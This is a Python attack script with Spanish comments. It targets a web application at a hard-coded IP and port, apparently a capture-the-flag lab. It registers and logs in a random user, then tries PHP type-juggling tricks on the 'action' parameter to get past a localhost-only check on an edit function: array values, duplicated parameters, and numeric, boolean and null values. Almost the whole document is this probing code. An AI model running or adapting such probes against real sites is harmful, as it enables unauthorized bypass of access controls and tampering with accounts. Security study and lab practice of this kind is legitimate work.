#!/usr/bin/env python3
"""
PHP Type Juggling puede causar comportamientos inesperados
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar type juggling con action
print("[*] Probando type juggling con 'action' parameter...")

# En PHP: if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1')
# ¿Puedo hacer que REMOTE_ADDR sea interpretado diferente?

# Intentar enviar action como array
print("\n[1] action como array:")
data_req = {
    'action[]': 'edit',
    'new_name': 'TEST'
}
resp = session.post(f"{TARGET}/", data=data_req)
if "Done!" in resp.text:
    print(f"    [+++] ¡Funcionó!")
elif "Only localhost" in resp.text:
    print(f"    [-] Rechazado")
else:
    print(f"    [?] Respuesta: {len(resp.text)} bytes")

# Intentar enviar múltiples action
print("\n[2] Múltiples action parameters:")
resp = session.post(f"{TARGET}/", data="action=&action=edit&new_name=TEST", headers={'Content-Type': 'application/x-www-form-urlencoded'})
if "Done!" in resp.text:
    print(f"    [+++] ¡Funcionó!")
elif "Only localhost" in resp.text:
    print(f"    [-] Rechazado")

# Intentar con valores numéricos
print("\n[3] action con valores numéricos:")
for val in [0, 1, -1, 999, 0.0, 1.0]:
    resp = session.post(f"{TARGET}/", data={'action': val, 'new_name': 'TEST'})
    import re
    if "Done!" in resp.text:
        print(f"    [+++] action={val} funcionó!")
        break

# Intentar con boolean
print("\n[4] action con boolean:")
resp = session.post(f"{TARGET}/", data={'action': 'true', 'new_name': 'TEST'})
if "Done!" in resp.text:
    print(f"    [+++] ¡Funcionó con 'true'!")

resp = session.post(f"{TARGET}/", data={'action': 'false', 'new_name': 'TEST'})
if "Done!" in resp.text:
    print(f"    [+++] ¡Funcionó con 'false'!")

# Intentar con null
print("\n[5] action con null:")
resp = session.post(f"{TARGET}/", data={'action': 'null', 'new_name': 'TEST'})
if "Done!" in resp.text:
    print(f"    [+++] ¡Funcionó con 'null'!")
